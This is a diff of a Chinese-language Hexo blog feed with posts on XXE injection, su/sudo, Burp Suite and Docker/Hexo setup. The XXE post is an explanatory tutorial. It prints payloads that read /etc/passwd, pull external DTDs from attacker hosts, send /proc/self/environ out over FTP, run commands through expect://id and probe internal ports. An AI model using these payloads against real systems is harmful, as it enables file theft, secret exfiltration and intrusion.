class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">evil</span>/<span class="attr">evil.xml</span>"&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">stuff</span>;%<span class="attr">end</span>;"&gt;</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [  </span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" &gt;</span></span><br><span class="line"><span class="meta">  %one;</span></span><br><span class="line"><span class="meta">  %two;</span></span><br><span class="line"><span class="meta">  %four;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">three</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % two "&lt;!ENTITY % four SYSTEM 'file:///%three;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd"&gt;</span></span><br><span class="line"><span class="meta">%asd;</span></span><br><span class="line"><span class="meta">%c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;rrr;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## External dtd ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">d</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">proc</span>/<span class="attr">self</span>/<span class="attr">environ</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line"><span class="meta">&lt;!DOCTYPE :. SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM "http://"</span></span><br></pre></td></tr></table></figure>
+<h4 id="dtd文档类型定"><a class="markdownIt-Anchor" href="#dtd文档类型定"></a> DTD文档类型定</h4>
+<p>1） <strong>DTD内部、外部声明</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内部DTD：</span><br><span class="line">假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</span><br><span class="line">&lt;!DOCTYPE root-element [element-declarations]&gt;</span><br><span class="line"></span><br><span class="line">外部DTD：</span><br><span class="line">假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM “filename”&gt;</span><br><span class="line">解析时会调用外部DTD文件filename</span><br></pre></td></tr></table></figure>
-
-<p>2）  <strong>DTD参数实体、非参数实体</strong> </p>
+<p>2）  <strong>DTD参数实体、非参数实体</strong></p>
 <p>除了外部和内部的声明之外，DTD的实体还有参数和非参数之分。</p>
 <p>其中参数实体只能在DTD内部(XML的第二部分)以<code>%实体名</code>的方式引用，而非参数实体则可在XML文档元素，也就是XML的第三个部分以<code>&amp;实体名</code>的方式引用</p>
 <p>举例：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这是一个内部实体+非参数实体，参数在XML文档文档元素部分引用，不能使用协议</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY name "nMask"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这是一个外部实体+参数实体，参数在XML文档DTD内部引用，可以使用外部协议</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">    %name;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="XXE利用方式"><a href="#XXE利用方式" class="headerlink" title="XXE利用方式"></a>XXE利用方式</h3><p> 使用hackbar post构造的xml文档，或者burpsuite抓包进行post </p>
-<h4 id="A-有回显的注入"><a href="#A-有回显的注入" class="headerlink" title="A) 有回显的注入"></a>A) 有回显的注入</h4><h5 id="1）任意文件读取"><a href="#1）任意文件读取" class="headerlink" title="1）任意文件读取"></a>1）任意文件读取</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="2）命令执行"><a href="#2）命令执行" class="headerlink" title="2）命令执行"></a>2）命令执行</h5><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
+<h3 id="xxe利用方式"><a class="markdownIt-Anchor" href="#xxe利用方式"></a> XXE利用方式</h3>
+<p>使用hackbar post构造的xml文档，或者burpsuite抓包进行post</p>
+<h4 id="a-有回显的注入"><a class="markdownIt-Anchor" href="#a-有回显的注入"></a> A) 有回显的注入</h4>
+<h5 id="1任意文件读取"><a class="markdownIt-Anchor" href="#1任意文件读取"></a> 1）任意文件读取</h5>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="2命令执行"><a class="markdownIt-Anchor" href="#2命令执行"></a> 2）命令执行</h5>
+<p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="3）内网端口探测"><a href="#3）内网端口探测" class="headerlink" title="3）内网端口探测"></a>3）内网端口探测</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
+<h5 id="3内网端口探测"><a class="markdownIt-Anchor" href="#3内网端口探测"></a> 3）内网端口探测</h5>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以对80端口进行探测，一般会探测比较常用的端口。</p>
-<h5 id="4）攻击内网网站"><a href="#4）攻击内网网站" class="headerlink" title="4）攻击内网网站"></a>4）攻击内网网站</h5><p>结合网站框架本身的漏洞，如struts2</p>
+<h5 id="4攻击内网网站"><a class="markdownIt-Anchor" href="#4攻击内网网站"></a> 4）攻击内网网站</h5>
+<p>结合网站框架本身的漏洞，如struts2</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="5）过滤了ENTITY关键字"><a href="#5）过滤了ENTITY关键字" class="headerlink" title="5）过滤了ENTITY关键字"></a>5）过滤了ENTITY关键字</h5><p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，也就是在xml文档的第三部分使用ENTITY，所以在DTD文档类型定义中过滤了ENTITY的情况下，同样可以实现以上的四种方法。</p>
+<h5 id="5过滤了entity关键字"><a class="markdownIt-Anchor" href="#5过滤了entity关键字"></a> 5）过滤了ENTITY关键字</h5>
+<p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，也就是在xml文档的第三部分使用ENTITY，所以在DTD文档类型定义中过滤了ENTITY的情况下，同样可以实现以上的四种方法。</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE svg SYSTEM "http://118.89.16.36/evil.dtd"&gt;</span>   #????  test?  svg?</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>可以看到在文档内容的部分使用了恶意的代码构造。</p>
-<h5 id="6）行不通的方法"><a href="#6）行不通的方法" class="headerlink" title="6）行不通的方法"></a>6）行不通的方法</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param1 "file:///c:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param2 "http://127.0.0.1/?payload=%param1"&gt;</span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样看起来可以读取系统文件内容来作为payload，是个可用的方法。<br>但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
-<h4 id="B-无回显的XXE漏洞—Blind-XXE"><a href="#B-无回显的XXE漏洞—Blind-XXE" class="headerlink" title="B) 无回显的XXE漏洞—Blind XXE"></a>B) 无回显的XXE漏洞—Blind XXE</h4><h3 id="xxe防御"><a href="#xxe防御" class="headerlink" title="xxe防御"></a>xxe防御</h3><ol>
+<h5 id="6行不通的方法"><a class="markdownIt-Anchor" href="#6行不通的方法"></a> 6）行不通的方法</h5>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param1 "file:///c:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY %param2 "http://127.0.0.1/?payload=%param1"&gt;</span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样看起来可以读取系统文件内容来作为payload，是个可用的方法。<br>
+但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
+<h4 id="b-无回显的xxe漏洞blind-xxe"><a class="markdownIt-Anchor" href="#b-无回显的xxe漏洞blind-xxe"></a> B) 无回显的XXE漏洞—Blind XXE</h4>
+<h3 id="xxe防御"><a class="markdownIt-Anchor" href="#xxe防御"></a> xxe防御</h3>
+<ol>
 <li>使用开发语言提供的禁用外部实体的方法;</li>
-<li>过滤用户提交的XML数据;<ol>
+<li>过滤用户提交的XML数据;
+<ol>
 <li>检查所使用的底层xml解析库，默认禁止外部实体的解析</li>
 <li>使用第三方应用代码及时升级补丁</li>
 </ol>
@@ -493,8 +520,9 @@
     
     <summary type="html">
     
-      &lt;h3 id=&quot;xxe简介&quot;&gt;&lt;a href=&quot;#xxe简介&quot; class=&quot;headerlink&quot; title=&quot;xxe简介&quot;&gt;&lt;/a&gt;xxe简介&lt;/h3&gt;&lt;p&gt;XML External Entity Injection，xml外部实体注入漏洞&lt;/p&gt;
-&lt;p&gt; 当允许引用外部实
+      &lt;h3 id=&quot;xxe简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xxe简介&quot;&gt;&lt;/a&gt; xxe简介&lt;/h3&gt;
+&lt;p&gt;XML External Entity Injection，xml外部实体注入漏洞&lt;/p&gt;
+&lt;p&gt;当允许引用外部实体时，通过构
     
     </summary>
     
@@ -512,21 +540,25 @@
     <published>2019-12-12T00:24:03.000Z</published>
     <updated>2020-01-22T04:34:21.536Z</updated>
     
-    <content type="html"><![CDATA[<p> <code>su</code> 命令的主要作用是让你可以在已登录的会话中切换到另外一个用户。换句话说，这个工具可以让你在不登出当前用户的情况下登录为另外一个用户。</p>
-<p> 通过<code>su</code>可以在用户之间切换，而超级权限用户root向普通或虚拟用户切换不需要密码，而普通用户切换到其它任何用户都需要密码验证。 </p>
-<p> 还有一种方法可以切换到 root 用户：运行 <code>su -</code> 命令</p>
-<p> <code>su</code> 命令与 <code>su -</code> 命令之间有什么区别呢？前者在切换到 root 用户之后仍然保持旧的（或者说原始用户的）环境，而后者则是创建一个新的环境（由 root 用户 <code>~/.bashrc</code> 文件所设置的环境），相当于使用 root 用户正常登录（从登录屏幕登录）。</p>
-<h2 id="sudo与su"><a href="#sudo与su" class="headerlink" title="sudo与su"></a>sudo与su</h2><p> 两个命令的最大区别是：<code>sudo</code> 命令需要输入当前用户的密码，<code>su</code> 命令需要输入 root 用户的密码。</p>
-<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>sudo是一种权限管理机制，依赖于<code>/etc/sudoers</code>，其定义了授权给哪个用户可以以管理员的身份能够执行什么样的管理命令；</p>
+    <content type="html"><![CDATA[<p><code>su</code> 命令的主要作用是让你可以在已登录的会话中切换到另外一个用户。换句话说，这个工具可以让你在不登出当前用户的情况下登录为另外一个用户。</p>
+<p>通过<code>su</code>可以在用户之间切换，而超级权限用户root向普通或虚拟用户切换不需要密码，而普通用户切换到其它任何用户都需要密码验证。</p>
+<p>还有一种方法可以切换到 root 用户：运行 <code>su -</code> 命令</p>
+<p><code>su</code> 命令与 <code>su -</code> 命令之间有什么区别呢？前者在切换到 root 用户之后仍然保持旧的（或者说原始用户的）环境，而后者则是创建一个新的环境（由 root 用户 <code>~/.bashrc</code> 文件所设置的环境），相当于使用 root 用户正常登录（从登录屏幕登录）。</p>
+<h2 id="sudo与su"><a class="markdownIt-Anchor" href="#sudo与su"></a> sudo与su</h2>
+<p>两个命令的最大区别是：<code>sudo</code> 命令需要输入当前用户的密码，<code>su</code> 命令需要输入 root 用户的密码。</p>
+<h3 id="sudo"><a class="markdownIt-Anchor" href="#sudo"></a> sudo</h3>
+<p>sudo是一种权限管理机制，依赖于<code>/etc/sudoers</code>，其定义了授权给哪个用户可以以管理员的身份能够执行什么样的管理命令；</p>
 <p>格式：<code>sudo -u USERNAME COMMAND</code></p>
 <p>默认情况下，系统只有root用户可以执行sudo命令。需要root用户通过使用<code>visudo</code>命令编辑sudo的配置文件<code>/etc/sudoers</code>，才可以授权其他普通用户执行sudo命令。</p>
-<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.<br><code>sudo -l</code> The <code>-l</code> (list) option will list out the allowed (and forbidden) commands for the user on the current host.<br>通常来检查非root用户可以以高权限运行命令的程序。</p>
-<h3 id="su"><a href="#su" class="headerlink" title="su"></a>su</h3><p>su为<code>switch user</code>，即切换用户的简写。</p>
+<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.<br>
+<code>sudo -l</code> The <code>-l</code> (list) option will list out the allowed (and forbidden) commands for the user on the current host.<br>
+通常来检查非root用户可以以高权限运行命令的程序。</p>
+<h3 id="su"><a class="markdownIt-Anchor" href="#su"></a> su</h3>
+<p>su为<code>switch user</code>，即切换用户的简写。</p>
 <p>su是最简单的身份切换名，用su我们能够进行不论什么用户的切换，一般都是<code>su - username</code>，然后输入password就ok了，可是root用su切换到其它身份的时候是不须要输入password的。</p>
 <p>格式为两种：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su -l USERNAME（-l为login，即登陆的简写）</span><br><span class="line">su USERNAME</span><br></pre></td></tr></table></figure>
-
-<p> 如果不指定USERNAME（用户名），默认即为root，所以切换到root的身份的命令即为：<code>su -root</code>或<code>su -</code>，<code>su root</code> 或<code>su</code>。</p>
+<p>如果不指定USERNAME（用户名），默认即为root，所以切换到root的身份的命令即为：<code>su -root</code>或<code>su -</code>，<code>su root</code> 或<code>su</code>。</p>
 <p><code>su USERNAME</code>，与<code>su - USERNAME</code>的不同之处如下：</p>
 <ul>
 <li><code>su - USERNAME</code>切换用户后，同时切换到新用户的工作环境中。</li>
@@ -536,14 +568,13 @@
 <p>当我们输入su时会发现要输入密码，我们尝试输入自己当前用户的密码，发现failure。</p>
 <p>但我们又不知道su密码是什么？其实su初始密码可以通过下面方式进行设置：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`sudo` `passwd`</span><br></pre></td></tr></table></figure>
-
-<p>设置完后再输入su命令并键入刚才设置的密码即可进入~ </p>
+<p>设置完后再输入su命令并键入刚才设置的密码即可进入~</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt; &lt;code&gt;su&lt;/code&gt; 命令的主要作用是让你可以在已登录的会话中切换到另外一个用户。换句话说，这个工具可以让你在不登出当前用户的情况下登录为另外一个用户。&lt;/p&gt;
-&lt;p&gt; 通过&lt;code&gt;su&lt;/code&gt;可以在用户之间切换，而超级权限用户root向普通或虚拟用户
+      &lt;p&gt;&lt;code&gt;su&lt;/code&gt; 命令的主要作用是让你可以在已登录的会话中切换到另外一个用户。换句话说，这个工具可以让你在不登出当前用户的情况下登录为另外一个用户。&lt;/p&gt;
+&lt;p&gt;通过&lt;code&gt;su&lt;/code&gt;可以在用户之间切换，而超级权限用户root向普通或虚拟用户切换
     
     </summary>
     
@@ -561,14 +592,16 @@
     <published>2019-12-10T07:14:28.000Z</published>
     <updated>2019-12-10T07:49:08.809Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="过滤不想拦截的网站"><a href="#过滤不想拦截的网站" class="headerlink" title="过滤不想拦截的网站"></a>过滤不想拦截的网站</h3><p><a href="https://security.stackexchange.com/questions/187069/burpsuite-just-passthrough-firefox-detect-portal" target="_blank" rel="noopener">Burpsuite: just passthrough firefox detect portal</a></p>
+    <content type="html"><![CDATA[<h3 id="过滤不想拦截的网站"><a class="markdownIt-Anchor" href="#过滤不想拦截的网站"></a> 过滤不想拦截的网站</h3>
+<p><a href="https://security.stackexchange.com/questions/187069/burpsuite-just-passthrough-firefox-detect-portal" target="_blank" rel="noopener">Burpsuite: just passthrough firefox detect portal</a></p>
 <p>如果我们在Burpsuite遇到一个不想再拦截的请求，点击<code>Action</code>按钮，然后<code>Do not intercept...</code>，选择<code>requests to this host</code>即可。</p>
 <p>对于Firefox portal 请求，可以在浏览器地址栏输入<code>about:config</code>，然后搜索<code>network.captive-portal-service.enabled</code>，将<code>true</code>改为<code>false</code></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;过滤不想拦截的网站&quot;&gt;&lt;a href=&quot;#过滤不想拦截的网站&quot; class=&quot;headerlink&quot; title=&quot;过滤不想拦截的网站&quot;&gt;&lt;/a&gt;过滤不想拦截的网站&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://security.stackexchange.co
+      &lt;h3 id=&quot;过滤不想拦截的网站&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#过滤不想拦截的网站&quot;&gt;&lt;/a&gt; 过滤不想拦截的网站&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://security.stackexchange.com/questio
     
     </summary>
     
@@ -595,7 +628,6 @@
 </blockquote>
 <p>原来，docker是运行在Linux上的，在Windows中运行docker，实际上还是在Windows下先安装了一个Linux环境，然后在这个系统中运行的docker。也就是说，服务中使用的localhost指的是这个Linux环境的地址，而不是我们的宿主环境Windows。我们可以通过cmd命令</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">docker-machine ip default</span><br></pre></td></tr></table></figure>
-
 <p>找到这个Linux的ip地址，<strong>一般情况下这个地址是192.168.99.100</strong>，然后在Windows的浏览器中，输入这个地址，加上服务的端口即可启用了。</p>
 ]]></content>
     
@@ -620,32 +652,33 @@
     <published>2019-12-09T03:07:13.000Z</published>
     <updated>2019-12-09T09:02:50.278Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="install-docker"><a href="#install-docker" class="headerlink" title="install docker"></a>install docker</h2><p><a href="http://flamepeak.com/2019/11/22/Docker-install-on-kali-20191122/">http://flamepeak.com/2019/11/22/Docker-install-on-kali-20191122/</a></p>
-<h2 id="install-git-、nodejs"><a href="#install-git-、nodejs" class="headerlink" title="install git 、nodejs"></a>install git 、nodejs</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br><span class="line">docker run -itd --name hexo_byMe ubuntu /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it hexo_byMe /bin/bash</span><br></pre></td></tr></table></figure>
-
+    <content type="html"><![CDATA[<h2 id="install-docker"><a class="markdownIt-Anchor" href="#install-docker"></a> install docker</h2>
+<p><a href="http://flamepeak.com/2019/11/22/Docker-install-on-kali-20191122/">http://flamepeak.com/2019/11/22/Docker-install-on-kali-20191122/</a></p>
+<h2 id="install-git-nodejs"><a class="markdownIt-Anchor" href="#install-git-nodejs"></a> install git 、nodejs</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br><span class="line">docker run -itd --name hexo_byMe ubuntu /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it hexo_byMe /bin/bash</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get udpate</span><br><span class="line"><span class="comment"># 安装git</span></span><br><span class="line">apt-get install git-core</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装nodejs</span></span><br><span class="line"><span class="comment">#https://github.com/nodesource/distributions</span></span><br><span class="line"><span class="comment"># Using Ubuntu</span></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查安装是否成功</span></span><br><span class="line">node -v</span><br><span class="line">npm</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">npm install hexo --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br><span class="line">npm install hexo-renderer-marked --save</span><br><span class="line"></span><br><span class="line"><span class="comment">#如有必要安装pandoc</span></span><br><span class="line">curl -O -sL https://github.com/jgm/pandoc/releases/download/2.8.1/pandoc-2.8.1-1-amd64.deb </span><br><span class="line">dpkg -i pandoc-2.8.1-1-amd64.deb</span><br><span class="line"><span class="comment">#如果上面命令不行，可以尝试</span></span><br><span class="line">curl -sL -O http://th.archive.ubuntu.com/ubuntu/pool/universe/p/pandoc/pandoc_1.19.2.4~dfsg-1build4_amd64.deb</span><br><span class="line">dpkg -i pandoc_1.19.2.4~dfsg-1build4_amd64.deb</span><br><span class="line">apt --fix-broken install</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br></pre></td></tr></table></figure>
-
-<h2 id="测试Hexo"><a href="#测试Hexo" class="headerlink" title="测试Hexo"></a>测试Hexo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g </span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
+<h2 id="安装hexo"><a class="markdownIt-Anchor" href="#安装hexo"></a> 安装Hexo</h2>
